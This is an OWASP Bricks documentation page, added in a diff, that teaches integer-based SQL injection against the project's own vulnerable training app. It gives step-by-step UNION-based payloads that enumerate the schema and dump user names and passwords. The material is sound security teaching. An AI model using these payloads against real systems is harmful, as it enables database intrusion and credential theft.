@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if IE 7]>    <html class="no-js lt-ie9 lt-ie8" lang="en"> <![endif]-->
+<!--[if IE 8]>    <html class="no-js lt-ie9" lang="en"> <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en"> <!--<![endif]-->
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width" />
+  <title>OWASP Bricks content page #1</title>  
+  <!-- Included CSS Files (Uncompressed) -->
+  <!--
+  <link rel="stylesheet" href="../stylesheets/foundation.css">
+  -->  
+  <!-- Included CSS Files (Compressed) -->
+  <link rel="stylesheet" href="../stylesheets/foundation.min.css">
+  <link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+  <link rel="stylesheet" href="../stylesheets/app.css">
+  <link rel="icon" href="../favicon.ico" type="image/x-icon">
+  <script src="../javascripts/modernizr.foundation.js"></script>
+  <!-- IE Fix for HTML5 Tags -->
+  <!--[if lt IE 9]>
+    <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+  <![endif]-->
+</head>
+<body>
+  <!-- Header and Nav -->
+
+  <div class="row">
+    <div class="three columns">
+      <h1><a href="../"><img src="../images/bricks.jpg" /></a></h1>
+    </div>
+    <div class="nine columns">
+      <ul class="nav-bar right">
+        <li><a href="../index.php">Home</a></li>
+		<li><a href="../download.html">Download</a></li>
+        <li><a href="../docs/">Docs</a></li>
+        <li><a href="http://owaspbricks.blogspot.com/">Blog</a></li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- End Header and Nav -->
+  
+  <div class="row">
+    <div class="eight columns">
+
+	    <h4>Bricks Documentation</h4>
+      </div>
+      </div>
+	  
+	  
+  <div class="row">
+    <div class="twelve columns">
+    <div class="three columns" style="padding: 0 0px;">
+	<ul class="nav-bar vertical">
+  <li><a href="index.php">Getting started</a></li>
+  <li><a href="installation.html">Installation</a></li>
+  <li class="has-flyout">
+    <a href="login-pages.html">Login pages</a>
+    <a href="login-pages.html" class="flyout-toggle"><span> </span></a>
+    <div class="flyout">
+      <h5><a href="login-pages.html">Login pages</a></h5>
+      <div class="row">
+        <div class="six columns">
+          <div style="line-height:2.4;"><a href="login-1.html"><b>Login #1</b></a><br/><br/></div>
+        </div>
+        <div class="six columns">
+          <div style="line-height:2.4;"></div>
+        </div>
+      </div>
+    </div>
+  </li>
+  <li class="has-flyout">
+    <a href="file-upload-pages.html">File upload pages</a>
+    <a href="file-upload-pages.html" class="flyout-toggle"><span> </span></a>
+    <div class="flyout">
+      <h5><a href="file-upload-pages.html">File upload pages</a></h5>
+      <div class="row">
+        <div class="six columns">
+			<div style="line-height:2.4;"><a href="file-upload-1.html"><b>Upload #1</b></a><br/></div>
+        </div>
+        <div class="six columns">
+			<div style="line-height:2.4;"></div>
+        </div>
+      </div>
+    </div>
+  </li>
+  <li class="active has-flyout">
+    <a href="content-pages.html">Content pages</a>
+    <a href="content-pages.html" class="flyout-toggle"><span> </span></a>
+    <div class="flyout" style="width: 400px;">
+      <h5><a href="content-pages.html">Content pages</a></h5>
+      <div class="row">
+        <div class="four columns">
+			<div style="line-height:2.4;"><a href="content-page-1.html"><b>Content #1</b></a><br/></div>
+        </div>
+        <div class="four columns">
+			<div style="line-height:2.4;"></div>
+        </div>
+        <div class="four columns">
+			<div style="line-height:2.4;"></div>
+        </div>
+      </div>
+    </div>
+  </li>
+</ul>
+	
+	</div>
+	<div class="nine columns">	
+	<h4>Content page #1</h4>
+	<p>
+	<ul class="disc">
+	<li>Content page with integer input in URL</li>
+	<li><span style="color:orange">id</span> parameter is prone to code injection.</li>
+	</ul><br/>
+	</p>
+	<h5>Advanced SQL Injection - Integer based</h5>
+	<iframe width="560" height="315" src="http://www.youtube.com/embed/j5I0wPvQxTg?rel=0" frameborder="0" allowfullscreen></iframe><br/>	
+	<p>
+		<b>URL:</b> <span style="color:blue">bricks/content-1/index.php?id=0</span><br/>
+		<b>SQL Query:</b> <span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> idusers=<span style="color:orange">0</span> <span style="color:blue">LIMIT</span> <span style="color:orange">1</span><br/>
+	</p>
+	<p>
+		Here, the <span style="color:orange">id</span> parameter is accepting input through the URL of the browser. Change the input value and it will yield different output based on the input given.
+	</p>
+	
+	<br/>	
+	
+	<p>
+	<b>URL:</b> <span style="color:blue">bricks/content-1/index.php?id=1</span><br/>
+	<b>SQL Query:</b> <span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> idusers=<span style="color:orange">1</span> <span style="color:blue">LIMIT</span> <span style="color:orange">1</span><br/>
+	</p>
+	<p>This time, the web page displays the details of another user. Since <span style="color:orange">id</span> parameter is accepting input, it is a nice starting point to begin testing. First, it should be tested to check whether it is vulnerable to SQL injection or not.
+	</p>
+	
+	<br/>
+	
+	<p>
+	<b>URL:</b> <span style="color:blue">bricks/content-1/index.php?id=0'</span><br/>	
+	<b>SQL Query:</b> <span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> idusers=0<span style="color:grey">' LIMIT 1</span><br/>
+	</p>
+	<p>There is no output on the page but some error messages. That means the <span style="color:orange">id</span> parameter is vulnerable to code injection and the code we inserted just broke the query. The injected code must be put in a manner that it won't break the complete SQL statement. The next step is to inject specially crafted SQL commands to verify the existence of vulnerability.
+	</p>
+	
+	<br/>
+	
+	<p>
+	<b>URL:</b> <span style="color:blue">bricks/content-1/index.php?id=0 and 1=1</span><br/>
+	<b>SQL Query:</b> <span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> idusers=<span style="color:orange">0</span> and <span style="color:orange">1</span>=<span style="color:orange">1</span> <span style="color:blue">LIMIT</span> <span style="color:orange">1</span><br/>
+	</p>
+	<p>The page is displayed without any errors. This is because the added code is a true statement. What if the added statement was not returning a true condition?
+	</p>
+	
+	<br/>
+	
+	<p>
+	<b>URL:</b> <span style="color:blue">bricks/content-1/index.php?id=0 and 1=2</span><br/>
+	<b>SQL Query:</b> <span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> idusers=<span style="color:orange">0</span> and <span style="color:orange">1</span>=<span style="color:orange">2</span> <span style="color:blue">LIMIT</span> <span style="color:orange">1</span><br/>
+	</p>
+	<p>
+	Since the injected code contains an always false statement, the web page does not displays any content and is showing an error message saying that user does not exists. This proves that the code injected on to the <span style="color:orange">id</span> parameter is actually getting executed.<br/><br/> The injected code can be further modified to perform more advanced functions including obtaining/removing/changing confidential information. However, at the present stage, there are no clear knowledge about the database, version, tables, columns etc. So, these details has to be enumerated first. Finding the number of columns in the current database is relatively easy task.
+	</p>
+	
+	<br/>
+	
+	<p>
+	<b>URL:</b> <span style="color:blue">bricks/content-1/index.php?id=0 order by 1</span><br/>
+	<b>SQL Query:</b> <span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> idusers=<span style="color:orange">0</span> <span style="color:blue">order by</span> <span style="color:orange">1</span> <span style="color:blue">LIMIT</span> <span style="color:orange">1</span><br/>
+	</p>
+	<p>
+	The page displays the content without any issues and there are no error messages.
+	</p>
+	
+	<br/>
+	
+	<p>
+	<b>URL:</b> <span style="color:blue">bricks/content-1/index.php?id=0 order by 2</span><br/>
+	<b>SQL Query:</b> <span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> idusers=<span style="color:orange">0</span> <span style="color:blue">order by</span> <span style="color:orange">2</span> <span style="color:blue">LIMIT</span> <span style="color:orange">1</span><br/>
+	</p>
+	<p>
+	The page displays the content without any issues and there are no error messages. So there exists at least two columns.
+	</p>
+	
+	<br/>
+	
+	<p>
+	<b>URL:</b> <span style="color:blue">bricks/content-1/index.php?id=0 order by 3</span><br/>
+	<b>SQL Query:</b> <span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> idusers=<span style="color:orange">0</span> <span style="color:blue">order by</span> <span style="color:orange">3</span> <span style="color:blue">LIMIT</span> <span style="color:orange">1</span><br/>
+	</p>
+	<p>
+	The page displays the content without any issues and there are no error messages. So there exists at least three columns.<br/><br/> This process has to be repeated by increasing the value till the page shows some changes in the displayed page.<br/><br/>.<br/>.<br/>.<br/>.<br/><br/>
+	<b>URL:</b> <span style="color:blue">bricks/content-1/index.php?id=0 order by 8</span><br/>
+	<b>SQL Query:</b> <span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> idusers=<span style="color:orange">0</span> <span style="color:blue">order by</span> <span style="color:orange">8</span> <span style="color:blue">LIMIT</span> <span style="color:orange">1</span><br/>
+	The page displays the content without any issues and there are no error messages. So there exists at least eight columns.
+	</p>
+	
+	<br/>
+	
+	<p>
+	<b>URL:</b> <span style="color:blue">bricks/content-1/index.php?id=0 order by 9</span><br/>
+	<b>SQL Query:</b> <span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> idusers=<span style="color:orange">0</span> <span style="color:blue">order by</span> <span style="color:orange">9</span> <span style="color:blue">LIMIT</span> <span style="color:orange">1</span><br/>
+	</p>
+	<p>
+	This time the pages displays some error, so 9th column does not exists. This confirms that there are only 8 columns.<br/><br/>A union select statement has to be made accordingly to find out the columns which are vulnerable out of the 8 columns.
+	</p>
+	
+	<br/>
+	
+	<p>
+	<b>URL:</b> <span style="color:blue">bricks/content-1/index.php?id=0 UNION SELECT 1,2,3,4,5,6,7,8</span><br/>
+	<b>SQL Query:</b> <span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> idusers=<span style="color:orange">0</span> <span style="color:blue">UNION SELECT</span> <span style="color:orange">1</span>,<span style="color:orange">2</span>,<span style="color:orange">3</span>,<span style="color:orange">4</span>,<span style="color:orange">5</span>,<span style="color:orange">6</span>,<span style="color:orange">7</span>,<span style="color:orange">8</span> <span style="color:blue">LIMIT</span> <span style="color:orange">1</span><br/>
+	</p>
+	<p>
+	This time the page is not showing anything special rather than usual content. This is because the page is showing only the first result since it treats only the first line of the result. If that is the case, the injected code should be modified a little to make only the second line valid. There are many ways to do that.
+	</p>
+	
+	<br/>
+	
+	<p>
+	<b>URL:</b> <span style="color:blue">bricks/content-1/index.php?id=99999 UNION SELECT 1,2,3,4,5,6,7,8</span><br/>
+	<b>SQL Query:</b> <span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> idusers=<span style="color:orange">99999</span> <span style="color:blue">UNION SELECT</span> <span style="color:orange">1</span>,<span style="color:orange">2</span>,<span style="color:orange">3</span>,<span style="color:orange">4</span>,<span style="color:orange">5</span>,<span style="color:orange">6</span>,<span style="color:orange">7</span>,<span style="color:orange">8</span> <span style="color:blue">LIMIT</span> <span style="color:orange">1</span><br/>
+	</p>
+	<p>
+	Here, it is assumed that the number of user information stored in the database is less than 99999. SInce there is no users with userid 99999, the first line obviously becomes invalid opening doors for the second line. Thus, the output changes accordingly on the displayed page.
+	</p>
+	
+	<br/>
+	
+	<p>
+	<b>URL:</b> <span style="color:blue">bricks/content-1/index.php?id=0 and 1=2 UNION SELECT 1,2,3,4,5,6,7,8</span><br/>
+	<b>SQL Query:</b> <span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> idusers=<span style="color:orange">0</span> <span style="color:blue">and</span> <span style="color:orange">1</span>=<span style="color:orange">2</span> <span style="color:blue">UNION SELECT</span> <span style="color:orange">1</span>,<span style="color:orange">2</span>,<span style="color:orange">3</span>,<span style="color:orange">4</span>,<span style="color:orange">5</span>,<span style="color:orange">6</span>,<span style="color:orange">7</span>,<span style="color:orange">8</span> <span style="color:blue">LIMIT</span> <span style="color:orange">1</span><br/>
+	</p>
+	<p>
+	This is also a possible solution to make the first part of the command invalid.</p><p>
+	In both cases, the page is displaying some numbers instead of the actual user details. These are the corresponding number of columns that are vulnerable.
+	</p>
+	
+	<br/>
+	
+	<p>
+	<b>URL:</b> <span style="color:blue">bricks/content-1/index.php?id=0 and 1=2 UNION SELECT user(),2,3,4,5,6,7,8</span><br/>
+	<b>SQL Query:</b> <span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> idusers=<span style="color:orange">0</span> <span style="color:blue">and</span> <span style="color:orange">1</span>=<span style="color:orange">2</span> <span style="color:blue">UNION SELECT user</span>(),<span style="color:orange">2</span>,<span style="color:orange">3</span>,<span style="color:orange">4</span>,<span style="color:orange">5</span>,<span style="color:orange">6</span>,<span style="color:orange">7</span>,<span style="color:orange">8</span> <span style="color:blue">LIMIT</span> <span style="color:orange">1</span><br/>
+	</p>
+	<p>
+	The number 1 has been replaced by the user name of the current database user, which is <b>root@localhost</b>
+	</p>
+	
+	<br/>
+	
+	<p>
+	<b>URL:</b> <span style="color:blue">bricks/content-1/index.php?id=0 and 1=2 UNION SELECT version(),2,3,4,5,6,7,8</span><br/>
+	<b>SQL Query:</b> <span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> idusers=<span style="color:orange">0</span> <span style="color:blue">and</span> <span style="color:orange">1</span>=<span style="color:orange">2</span> <span style="color:blue">UNION SELECT version</span>(),<span style="color:orange">2</span>,<span style="color:orange">3</span>,<span style="color:orange">4</span>,<span style="color:orange">5</span>,<span style="color:orange">6</span>,<span style="color:orange">7</span>,<span style="color:orange">8</span> <span style="color:blue">LIMIT</span> <span style="color:orange">1</span><br/>
+	</p>
+	<p>
+	This helps to obtain the database version.
+	</p>
+	
+	<br/>
+	
+	<p>
+	<b>URL:</b> <span style="color:blue">bricks/content-1/index.php?id=0 and 1=2 UNION SELECT database(),2,3,4,5,6,7,8</span><br/>
+	<b>SQL Query:</b> <span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> idusers=<span style="color:orange">0</span> <span style="color:blue">and</span> <span style="color:orange">1</span>=<span style="color:orange">2</span> <span style="color:blue">UNION SELECT database</span>(),<span style="color:orange">2</span>,<span style="color:orange">3</span>,<span style="color:orange">4</span>,<span style="color:orange">5</span>,<span style="color:orange">6</span>,<span style="color:orange">7</span>,<span style="color:orange">8</span> <span style="color:blue">LIMIT</span> <span style="color:orange">1</span><br/>
+	</p>
+	<p>
+	The current database name is displayed - <b>bricks</b>. Now, the tables on the current database has to be enumerated.
+	</p>
+	
+	<br/>
+	
+	<p>
+	<b>URL:</b> <span style="color:blue">bricks/content-1/index.php?id=0 and 1=2 UNION SELECT table_name,2,3,4,5,6,7,8 from information_schema.tables where table_schema='bricks'</span><br/>
+	<b>SQL Query:</b> <span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> idusers=<span style="color:orange">0</span> and <span style="color:orange">1</span>=<span style="color:orange">2</span> <span style="color:blue">UNION SELECT</span> table_name,<span style="color:orange">2</span>,<span style="color:orange">3</span>,<span style="color:orange">4</span>,<span style="color:orange">5</span>,<span style="color:orange">6</span>,<span style="color:orange">7</span>,<span style="color:orange">8</span> <span style="color:blue">from</span> information_schema.tables <span style="color:blue">where</span> table_schema=<span style="color:grey">'bricks'</span> <span style="color:blue">LIMIT</span> <span style="color:orange">1</span><br/>
+	</p>
+	<p>
+	Since there is only one table in the bricks database, that information is displayed. Next objective is to find out the columns in the <b>users</b>.
+	</p>
+	
+	<br/>
+	
+	<p>
+	<b>URL:</b> <span style="color:blue">bricks/content-1/index.php?id=0 and 1=2 UNION SELECT column_name,2,3,4,5,6,7,8 from information_schema.columns where table_schema='bricks' and table_name='users' LIMIT 0,1 -- -</span><br/>
+	<b>SQL Query:</b> <span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> idusers=<span style="color:orange">0</span> and <span style="color:orange">1</span>=<span style="color:orange">2</span> <span style="color:blue">UNION SELECT</span> table_name,<span style="color:orange">2</span>,<span style="color:orange">3</span>,<span style="color:orange">4</span>,<span style="color:orange">5</span>,<span style="color:orange">6</span>,<span style="color:orange">7</span>,<span style="color:orange">8</span> <span style="color:blue">from</span> information_schema.tables <span style="color:blue">where</span> table_schema=<span style="color:grey">'bricks'</span> <span style="color:blue">and</span> table_name=<span style="color:grey">'users'</span> <span style="color:blue">LIMIT</span> <span style="color:orange">0</span>,<span style="color:orange">1</span> <span style="color:green">-- - LIMIT 1</span><br/>
+	</p>
+	<p>
+	<b>idusers</b> is the name of the first column in the <b>users</b> table. There can be two LIMIT functions seen in the executed query and they make collisions and result in broken syntax. In order to avoid this issue, immediately after the injected LIMIT function, -- - has been added to comment out rest of the query.
+	</p>
+	
+	<br/>
+	
+	<p>
+	<b>URL:</b> <span style="color:blue">bricks/content-1/index.php?id=0 and 1=2 UNION SELECT column_name,2,3,4,5,6,7,8 from information_schema.columns where table_schema='bricks' and table_name='users' LIMIT 1,1 -- -</span><br/>
+	<b>SQL Query:</b> <span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> idusers=<span style="color:orange">0</span> and <span style="color:orange">1</span>=<span style="color:orange">2</span> <span style="color:blue">UNION SELECT</span> column_name,<span style="color:orange">2</span>,<span style="color:orange">3</span>,<span style="color:orange">4</span>,<span style="color:orange">5</span>,<span style="color:orange">6</span>,<span style="color:orange">7</span>,<span style="color:orange">8</span> <span style="color:blue">from</span> information_schema.columns <span style="color:blue">where</span> table_schema=<span style="color:grey">'bricks'</span> <span style="color:blue">and</span> table_name=<span style="color:grey">'users'</span> <span style="color:blue">LIMIT</span> <span style="color:orange">1</span>,<span style="color:orange">1</span> <span style="color:green">-- - LIMIT 1</span><br/>
+	</p>
+	<p>
+	<b>name</b> is the name of the second column in the <b>users</b> table.
+	</p>
+	
+	<br/>
+	
+	<p>
+	This process should be continued till LIMIT 7,1 (as the total number of columns are eight and the numbering starts with 0). At the end of the process, following column names will be obtained: <b>idusers</b>, <b>name</b>, <b>email</b>, <b>password</b>, <b>ua</b>, <b>ref</b>, <b>host</b>, <b>lang</b>. The name and password are the most interesting columns. So, the next injected code should be for dumping the data from those columns.
+	</p>
+	
+	<br/>
+	
+	<p>
+	<b>URL:</b> <span style="color:blue">bricks/content-1/index.php?id=0 and 1=2 UNION SELECT concat(name,CHAR(32),password),2,3,4,5,6,7,8 from bricks.users LIMIT 0,1 -- -</span><br/>
+	<b>SQL Query:</b> <span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> idusers=<span style="color:orange">0</span> and <span style="color:orange">1</span>=<span style="color:orange">2</span> <span style="color:blue">UNION SELECT concat</span>(name,<span style="color:blue">CHAR</span>(32),password),<span style="color:orange">2</span>,<span style="color:orange">3</span>,<span style="color:orange">4</span>,<span style="color:orange">5</span>,<span style="color:orange">6</span>,<span style="color:orange">7</span>,<span style="color:orange">8</span> <span style="color:blue">from</span> bricks.users <span style="color:blue">LIMIT</span> <span style="color:orange">0</span>,<span style="color:orange">1</span> <span style="color:green">-- - LIMIT 1</span><br/>
+	</p>
+	<p>
+	This fetches the name and password from the first entry on the users table. CHAR(32) represents a space and is put there to make is easy to differentiate between the username and password.
+	</p>
+	
+	<br/>
+	
+	<p>
+	<b>URL:</b> <span style="color:blue">bricks/content-1/index.php?id=0 and 1=2 UNION SELECT concat(name,CHAR(32),password),2,3,4,5,6,7,8 from bricks.users LIMIT 1,1 -- -</span><br/>
+	<b>SQL Query:</b> <span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> idusers=<span style="color:orange">0</span> and <span style="color:orange">1</span>=<span style="color:orange">2</span> <span style="color:blue">UNION SELECT concat</span>(name,<span style="color:blue">CHAR</span>(32),password),<span style="color:orange">2</span>,<span style="color:orange">3</span>,<span style="color:orange">4</span>,<span style="color:orange">5</span>,<span style="color:orange">6</span>,<span style="color:orange">7</span>,<span style="color:orange">8</span> <span style="color:blue">from</span> bricks.users <span style="color:blue">LIMIT</span> <span style="color:orange">1</span>,<span style="color:orange">1</span> <span style="color:green">-- - LIMIT 1</span><br/>
+	</p>
+	<p>
+	This fetches the name and password from the second entry on the users table.<br/><br/>This process can be continued to obtain the username and password of all the users.
+	</p>
+    </div>
+  </div>
+  
+  
+ 
+  <!-- Footer -->
+
+  <footer class="row">
+    <div class="twelve columns">
+      <hr />
+      <div class="row">
+        <div class="six columns">
+          <p>OWASP Bricks</p>
+        </div>
+        <div class="six columns">
+          <div class="right">
+           <a href="http://www.facebook.com/OWASPBricks"><img src="../images/Facebook.png"/></a>&nbsp;<a href="https://twitter.com/OWASPBricks"><img src="../images/Twitter.png"/></a>&nbsp;<a href="https://sourceforge.net/p/owaspbricks/"><img src="../images/Sourceforge.png"/></a>&nbsp;<a href="https://www.owasp.org/index.php/OWASP_Bricks"><img src="../images/owasp.png"/></a>&nbsp;<a href="http://gplus.to/OWASPBricks"><img src="../images/Google+.png"/></a>&nbsp;<a href="https://www.youtube.com/OWASPBricks"><img src="../images/YouTube.png"/></a>&nbsp;<a href="http://owaspbricks.blogspot.com/"><img src="../images/Blogger.png"/></a>
+		</div> 		
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  
+	
+	
+	
+  </div>
+
+  
+  
+  <!-- Included JS Files (Uncompressed) -->
+  <!--
+  
+  <script src="../javascripts/jquery.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.mediaQueryToggle.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.forms.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.reveal.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.orbit.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.navigation.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.buttons.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.tabs.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.tooltips.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.accordion.js"></script>
+  
+  <script src="../javascripts/jquery.placeholder.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.alerts.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.topbar.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.joyride.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.clearing.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.magellan.js"></script>
+  
+  -->
+  
+  <!-- Included JS Files (Compressed) -->
+  <script src="../javascripts/jquery.js"></script>
+  <script src="../javascripts/foundation.min.js"></script>
+  
+  <!-- Initialize JS Plugins -->
+  <script src="../javascripts/app.js"></script>
+
+</body>
+</html>
